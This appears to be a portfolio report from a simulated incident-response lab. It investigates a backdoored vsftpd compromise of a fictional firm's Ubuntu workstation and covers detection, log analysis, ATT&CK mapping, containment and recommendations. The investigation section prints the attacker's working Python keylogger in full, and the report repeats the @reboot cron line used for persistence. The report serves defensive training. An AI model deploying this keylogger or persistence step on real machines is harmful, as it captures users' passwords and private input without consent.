# Madrid Logistics Incident Response Lab

## Lab Disclaimer

This project was conducted as a simulated incident-response exercise in an authorized lab environment. Madrid Logistics is a fictional organization used for the purposes of the scenario.

The IP addresses shown in this public portfolio version have been replaced with documentation-only addresses to avoid representing real external systems:

- `192.0.2.47` — affected security workstation
- `203.0.113.57` — simulated attacker system

## Executive Summary

On August 13, 2025, the security team at Madrid Logistics detected suspicious network activity involving an Ubuntu 22.04 LTS security workstation running a vulnerable version of `vsftpd`.

Investigation identified activity consistent with exploitation of CVE-2011-2523, a compromised version of vsftpd 2.3.4 containing a backdoor capable of opening a shell listener on TCP port `6200`. Following the suspected initial compromise, approximately 150 MB of outbound data transfer was observed, and a Python script named `security.py` was executed from `/tmp`.

Analysis of the script showed keylogging functionality. A cron entry was also identified that would execute the script after system reboot, providing a persistence mechanism.

The analyst responded by preserving relevant evidence, blocking communication with the suspicious external address, isolating the affected workstation, and escalating the incident to the appropriate security personnel. The system was subsequently investigated, rebuilt from a trusted baseline, and the vulnerable vsftpd installation was removed or upgraded.

The incident demonstrated weaknesses in vulnerability management, network exposure, outbound traffic controls, and software lifecycle management. Recommendations include improved vulnerability scanning, risk-based patch management, stronger network segmentation and filtering, improved egress controls, and regular review of incident-response procedures.

---

## Incident Overview

**Incident date:** August 13, 2025  
**Affected system:** Ubuntu Linux 22.04 LTS security workstation  
**Affected host:** `192.0.2.47`  
**Suspected attacker:** `203.0.113.57`  
**Primary vulnerable service:** vsftpd  
**Vulnerability:** CVE-2011-2523  
**Initial alert source:** Intrusion Detection System (IDS)

---

## Incident Timeline

| Time | Event |
|---|---|
| 23:36:49 CET | IDS detects suspicious traffic involving the security workstation |
| 23:37:49 CET | FTP session observed from suspicious external address |
| 23:38:16 CET | Approximately 150 MB of outbound traffic observed |
| 23:39:48 CET | `/tmp/security.py` observed executing |
| 23:41:00 CET | Cron execution of `security.py` observed |
| 23:48:51 CET | Analyst confirms the external address is not trusted |
| After confirmation | Containment begins and incident is escalated |
| 00:30:25 CET | Forensic preservation and remediation process begins |
| 01:01:56 CET | OpenVAS findings reviewed and vulnerable vsftpd installation addressed |
| August 19 | Stakeholder meeting held to review the incident and business impact |

---

## Detection

At `23:36:49 CET`, the Intrusion Detection System connected to the security team network detected suspicious network activity involving an Ubuntu 22.04 LTS security workstation.

The IDS identified communication involving the workstation at `192.0.2.47` and the external address `203.0.113.57`. Because the activity occurred outside normal business hours and involved an address that was not part of the organization's trusted infrastructure, the alert was escalated for investigation.

---

## Investigation

At `23:48:51 CET`, the analyst confirmed that the external address was not part of the organization's approved network infrastructure.

The analyst began reviewing relevant system and authentication logs, including:

```bash
/var/log/syslog
/var/log/auth.log
```

Three log entries were initially identified as being of particular interest:

```text
Aug 13 23:37:49 hostname vsftpd[6200]: [NOTICE] FTP session opened for user 'ftp' from 203.0.113.57

Aug 13 23:38:16 hostname kernel: [123456.789012] OUTBOUND: 192.0.2.47:21 -> 203.0.113.57:4444, 150MB transferred

Aug 13 23:39:48 hostname systemd[1]: Started /usr/bin/python3 /tmp/security.py
```

The first entry showed an FTP session originating from the suspicious external address.

The FTP log alone does not prove that command-line access was obtained. However, subsequent vulnerability scanning identified an affected version of vsftpd associated with CVE-2011-2523. Combined with the FTP activity and subsequent suspicious behavior on the host, this supported the conclusion that the vulnerable service was the likely initial-access vector.

The second log entry showed approximately `150 MB` of outbound network traffic from the compromised workstation to the suspicious external address. This was treated as suspected data exfiltration.

Further investigation would be required to determine exactly what data was transferred.

The third log entry showed execution of:

```bash
/usr/bin/python3 /tmp/security.py
```

The analyst retrieved and reviewed the script.

```python
import pynput
import logging
import os

# Set up logging
log_file = os.path.expanduser("~") + "/security.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Function to log keystrokes
def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))

# Function to start the keylogger
def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
```

Analysis confirmed that the script used the Python `pynput` library to monitor and record keyboard input.

This represented a keylogging capability that could potentially capture usernames, passwords, messages, or other sensitive information entered on the affected workstation.

### Persistence Mechanism

Further analysis identified the following entry in the user's crontab:

```bash
@reboot /usr/bin/python3 /tmp/security.py &
```

This configuration would cause `security.py` to execute whenever the system rebooted, allowing the keylogger to persist across system restarts.

A corresponding cron execution was observed:

```text
Aug 13 23:41:00 hostname CRON[6789]: (user) CMD (/usr/bin/python3 /tmp/security.py &)
```

This log confirms execution of the configured cron job.

It does **not**, by itself, establish exactly when the cron entry was originally created. Determining the creation time would require additional forensic evidence.

No evidence reviewed during this exercise confirmed that the attacker successfully escalated privileges to `root`.

---

## Systems Affected

### Compromised Host

- **Operating system:** Ubuntu Linux 22.04 LTS
- **Role:** Security department workstation
- **Public-report IP:** `192.0.2.47`
- **Affected service:** vsftpd
- **Compromised user context:** FTP/user-level activity observed
- **Privilege escalation:** No confirmed root escalation

### Simulated Attacker

- **Platform:** Kali Linux
- **Public-report IP:** `203.0.113.57`

### Relevant Network Services

- `21/TCP` — FTP control service and initial interaction with vsftpd
- `20/TCP` — traditionally associated with FTP data transfer in active mode
- `6200/TCP` — shell listener associated with the compromised vsftpd 2.3.4 package
- `22/TCP` — SSH service present on the host
- `23/TCP` — Telnet service present on the host
- `80/443 TCP` — HTTP/HTTPS services present on the host

The presence of ports `22`, `23`, `80`, and `443` did not establish that those services were exploited during the incident.

---

## Root Cause Analysis

The primary technical issue identified was the presence of a vulnerable version of vsftpd associated with **CVE-2011-2523**.

The affected vsftpd 2.3.4 distribution contained malicious backdoor code introduced through a compromised source package. When triggered, the backdoored service could open a shell listener on TCP port `6200`.

The vulnerability does not require normal application authentication or user interaction and carries a critical CVSS severity rating.

OpenVAS identified the vulnerable service during analysis of the affected workstation.

The incident therefore appears to have resulted primarily from a vulnerable legacy service remaining deployed on a system accessible to an attacker.

### Contributing Factors

Several additional weaknesses increased the likelihood or potential impact of the compromise:

- Insufficient vulnerability and patch management.
- Continued use of a known vulnerable service.
- Excessive exposure of unnecessary network services.
- Insufficient outbound traffic restrictions.
- Lack of effective egress filtering.
- Insufficient segmentation of the affected workstation.
- Lack of rapid remediation following vulnerability-scan findings.

The incident was therefore both a technical and process failure.

The vulnerable service provided the technical entry point, while gaps in vulnerability management and network controls allowed the exposure to remain present.

---

## Indicators of Compromise

### Network Indicators

```text
192.0.2.47      Affected workstation
203.0.113.57    Simulated attacker address
```

### Suspicious Log Entries

```text
Aug 13 23:37:49 hostname vsftpd[6200]: [NOTICE] FTP session opened for user 'ftp' from 203.0.113.57
```

Indicates suspicious FTP activity from the external system.

```text
Aug 13 23:38:16 hostname kernel: [123456.789012] OUTBOUND: 192.0.2.47:21 -> 203.0.113.57:4444, 150MB transferred
```

Indicates a large outbound transfer requiring investigation as potential data exfiltration.

```text
Aug 13 23:39:48 hostname systemd[1]: Started /usr/bin/python3 /tmp/security.py
```

Indicates execution of the identified keylogging script.

```text
Aug 13 23:41:00 hostname CRON[6789]: (user) CMD (/usr/bin/python3 /tmp/security.py &)
```

Shows execution of the malicious script through cron.

### Suspicious Files

```text
/tmp/security.py
~/security.txt
```

### Persistence Indicator

```bash
@reboot /usr/bin/python3 /tmp/security.py &
```

---

## MITRE ATT&CK Mapping

The following techniques are supported by evidence collected during the investigation.

| Technique | ID | Evidence | Confidence |
|---|---|---|---|
| Exploit Public-Facing Application | T1190 | Vulnerable externally reachable vsftpd service identified as likely initial-access vector | High |
| Scheduled Task/Job: Cron | T1053.003 | `@reboot` cron entry executing `security.py` | Confirmed |
| Input Capture: Keylogging | T1056.001 | `pynput.keyboard.Listener` implemented in `security.py` | Confirmed |
| Exfiltration Over Alternative Protocol | T1048 | Large outbound transfer associated with the compromised host | Possible / requires protocol confirmation |

### T1190 — Exploit Public-Facing Application

The attacker appears to have exploited a vulnerable externally accessible service to obtain initial access to the workstation.

OpenVAS identified the affected vsftpd version associated with CVE-2011-2523.

### T1053.003 — Scheduled Task/Job: Cron

The analyst identified the following cron entry:

```bash
@reboot /usr/bin/python3 /tmp/security.py &
```

This would execute the malicious script whenever the machine rebooted and therefore provided persistence.

### T1056.001 — Input Capture: Keylogging

The `security.py` script created a keyboard listener using `pynput`.

This functionality could capture information typed by users, including login credentials and other sensitive information.

### T1048 — Exfiltration Over Alternative Protocol

Approximately `150 MB` of outbound traffic was recorded from the affected host to the suspicious external address.

The available log supports suspected exfiltration, but additional packet or flow evidence would be required to conclusively determine the protocol and exact ATT&CK sub-technique used.

### Unconfirmed Reconnaissance

The attacker may have performed network reconnaissance before exploiting the vulnerable service. However, the evidence collected during this exercise does not directly demonstrate how the attacker originally discovered the host or vulnerable service.

For this reason, reconnaissance techniques such as network scanning are not classified as confirmed ATT&CK techniques in this report.

---

## Containment Actions

Once the activity had been confirmed as suspicious, the analyst began containment and escalated the incident to the appropriate level of the SOC.

### Evidence Preservation

Relevant logs, scripts, configuration information, and other volatile evidence were preserved in a secured forensic location before eradication activities began.

Preserving evidence before modifying the compromised system was necessary to support further forensic investigation and potential legal or compliance requirements.

### Block Suspicious Communications

The external address `203.0.113.57` was blocked at the firewall to prevent further communication with the affected host.

### Isolate the Workstation

The affected machine was moved into an isolated network segment with communication restricted to authorized security and forensic systems.

This reduced the likelihood of continued data exfiltration or lateral movement while allowing the investigation to continue.

### Restrict Network Traffic

Rather than permanently closing every potentially exposed port, network access to the compromised host was temporarily restricted using a default-deny approach.

Only traffic required by the security and forensic teams was permitted during containment.

This prevented unnecessary inbound and outbound communication while maintaining access required for investigation.

### Protect Potentially Exposed Accounts

Accounts and credentials known or reasonably suspected to have been exposed on the compromised workstation were disabled or rotated.

This reduced the possibility that captured credentials could later be used for privilege escalation or lateral movement.

---

## Eradication and Recovery

At approximately `00:30:25 CET`, the forensic team began the formal evidence-preservation and recovery process.

A forensic image of the affected system was created and relevant logs and artifacts were preserved before changes were made to the host.

The following malicious artifacts had been identified:

```text
/tmp/security.py
```

and:

```bash
@reboot /usr/bin/python3 /tmp/security.py &
```

Although these artifacts could be removed individually, the attacker had obtained interactive access to the system. Removing only known malicious files would therefore not provide sufficient assurance that all attacker modifications had been discovered.

The affected workstation was rebuilt from a known-good baseline before being returned to service.

The vulnerable vsftpd installation was removed or replaced with a patched and supported version.

Potentially exposed credentials were rotated before the rebuilt system was returned to the production environment.

### Vulnerability Review

At approximately `01:01:56 CET`, the security team reviewed the OpenVAS report.

The scan identified CVE-2011-2523 as a critical vulnerability associated with the installed vsftpd version.

The team used the scan results together with available vulnerability intelligence to determine the likely initial-access vector and identify additional remediation requirements.

### Network Hardening

Firewall policy was reviewed after the incident.

Instead of relying on whether a port was considered "standard" or "nonstandard," the organization adopted the principle that only services required for business or administrative purposes should be permitted.

Inbound and outbound traffic should follow a default-deny model where practical, with explicit rules allowing only necessary communication.

Particular attention should be given to outbound or **egress traffic**, as stronger egress controls may have limited communication between the compromised host and attacker-controlled infrastructure.

---

## Business Impact

The incident demonstrated several potential business risks.

A compromised workstation could allow an attacker to access or exfiltrate sensitive information, including internal data, credentials, customer information, or financial records.

The keylogging capability increased this risk because information entered by employees on the affected workstation could potentially have been captured.

A confirmed data breach may also create regulatory or contractual obligations depending on the type of information affected and the jurisdiction involved.

Additional organizational impacts could include:

- Financial costs associated with investigation and recovery.
- Operational downtime.
- Loss of employee or customer trust.
- Possible regulatory or contractual consequences.
- Diversion of security resources from other threats.
- Increased risk of further compromise through stolen credentials.

On August 19, the incident and its potential business implications were presented to management and other relevant stakeholders.

The objective of the meeting was to translate the technical findings into understandable operational and business risks and identify priorities for remediation.

---

## Lessons Learned

One of the primary lessons from the incident was the importance of consistent vulnerability and patch management.

Information regarding the affected vsftpd version was available through vulnerability databases and was detectable through OpenVAS. A stronger process for reviewing vulnerability-scan results and prioritizing high-risk findings could therefore have reduced the likelihood of exploitation.

Credentialed vulnerability scans should be performed regularly and their results combined with relevant threat intelligence.

Vulnerabilities should not be prioritized only according to their CVSS score. Additional context should include:

- Whether the affected system is externally exposed.
- Whether exploitation is publicly available.
- Whether the vulnerability is actively exploited.
- The value of the affected asset.
- The privileges available through successful exploitation.
- Existing compensating security controls.

Critical, externally exposed, or actively exploited vulnerabilities should follow an expedited remediation process. Where operationally feasible, a target such as **48 hours** may be appropriate for particularly urgent vulnerabilities.

Routine patches should follow a managed patching process that includes testing, deployment scheduling, monitoring, and rollback procedures rather than automatically upgrading systems whenever they reboot.

Another important lesson was the value of evidence preservation.

The analyst preserved relevant logs and malicious artifacts before recovery actions began, allowing the forensic team to continue investigating the incident.

The response also demonstrated the importance of network segmentation and outbound traffic monitoring. Restricting unnecessary communication can limit both lateral movement and data exfiltration after an attacker gains access to a host.

Incident-response playbooks should be reviewed at least annually and after significant security incidents to incorporate lessons learned and ensure analysts remain prepared to respond quickly.

---

## Recommendations

### 1. Improve Vulnerability Management

Perform regular credentialed vulnerability scans using OpenVAS or an equivalent vulnerability-management platform.

Quarterly credentialed scans may serve as a baseline, while internet-facing or particularly sensitive systems should be assessed more frequently based on organizational risk.

Scan results should be reviewed and converted into actionable remediation tasks rather than retained only as informational reports.

### 2. Establish Risk-Based Patch Management

Create defined remediation targets based on vulnerability severity, exploitability, asset criticality, exposure, and current threat intelligence.

Critical and actively exploited vulnerabilities affecting exposed systems should receive accelerated remediation.

Patching should be centrally managed and include:

- Testing.
- Deployment scheduling.
- Validation.
- Monitoring.
- Rollback procedures.

### 3. Remove Unsupported and Unnecessary Services

Services that are no longer required should be disabled or removed.

Supported software versions should be maintained throughout their lifecycle, and obsolete or vulnerable packages should be identified through regular inventory and vulnerability scanning.

### 4. Strengthen Network Segmentation

Separate security workstations, administrative systems, user networks, servers, and other sensitive assets into appropriate network segments.

Firewall rules between segments should permit only the communication required for legitimate business operations.

This limits the ability of an attacker to move laterally after compromising an individual host.

### 5. Implement Stronger Egress Filtering

Outbound connections from sensitive systems should be restricted to destinations and services required for normal operation.

Unexpected outbound communication, particularly large transfers or connections to unusual destinations, should generate alerts for investigation.

### 6. Apply Least-Privilege Firewall Rules

Firewall policy should follow a default-deny approach where practical.

Rules should be based on required:

- Sources.
- Destinations.
- Protocols.
- Ports.
- Applications.

A service should not automatically be trusted simply because it uses a common or standard port.

### 7. Improve Centralized Monitoring

IDS, host logs, network-flow information, and security events should be centrally collected and correlated through a SIEM or equivalent monitoring platform.

Alerts should prioritize unusual activity such as:

- Large outbound transfers.
- Connections outside normal business hours.
- Execution from temporary directories.
- Unexpected cron modifications.
- Connections to previously unseen external infrastructure.

### 8. Review Persistence Locations

Security monitoring should include common Linux persistence mechanisms, including:

- User and system crontabs.
- Systemd services and timers.
- Shell initialization files.
- Startup scripts.
- SSH authorized keys.

Unexpected changes to these locations should generate alerts.

### 9. Maintain Incident-Response Procedures

Incident-response playbooks should clearly define:

- Detection.
- Triage.
- Escalation.
- Evidence preservation.
- Containment.
- Eradication.
- Recovery.
- Post-incident review.

Playbooks should be tested through tabletop or technical exercises and reviewed annually or after major incidents.

### 10. Validate Recovery Before Returning Systems to Service

Systems that have suffered interactive attacker access should be rebuilt from a trusted baseline when appropriate rather than relying only on deletion of known malicious artifacts.

Before returning a rebuilt system to production, the organization should:

- Apply current security updates.
- Remove unnecessary services.
- Rotate potentially exposed credentials.
- Validate firewall rules.
- Perform vulnerability scanning.
- Confirm monitoring is functioning correctly.

---

## Tools and Technologies

The following technologies and concepts were used during the exercise:

- Ubuntu Linux 22.04 LTS
- Kali Linux
- vsftpd
- OpenVAS
- Linux system logs
- Cron
- Python
- `pynput`
- Firewall filtering
- IDS monitoring
- Network segmentation
- MITRE ATT&CK
- CVE and CVSS analysis
- Incident-response methodology

---

## Skills Demonstrated

- Security alert triage
- Linux log analysis
- Vulnerability analysis
- Identification of persistence mechanisms
- Python malware/script analysis
- Identification of Indicators of Compromise
- MITRE ATT&CK mapping
- Incident containment
- Evidence preservation
- Network security analysis
- Vulnerability-management planning
- Root-cause analysis
- Security remediation planning
- Business-impact communication
- Technical incident documentation

---

## Appendix

### 1.1 OpenVAS Discovery of Vulnerable Services

[Appendix 1.1.1](appendix11.png)

[Appendix 1.1.2](appendix112.png)

### 1.2 OpenVAS Report — CVE-2011-2523

[Appendix 1.2](appendix12.png)

### 1.3 Vulnerability References

The vulnerability and techniques discussed in this report can be cross-referenced against:

- NIST National Vulnerability Database — CVE-2011-2523
- Rapid7 documentation for the backdoored vsftpd 2.3.4 package
- MITRE ATT&CK — T1190 Exploit Public-Facing Application
- MITRE ATT&CK — T1053.003 Scheduled Task/Job: Cron
- MITRE ATT&CK — T1056.001 Input Capture: Keylogging
- MITRE ATT&CK — T1048 Exfiltration Over Alternative Protocol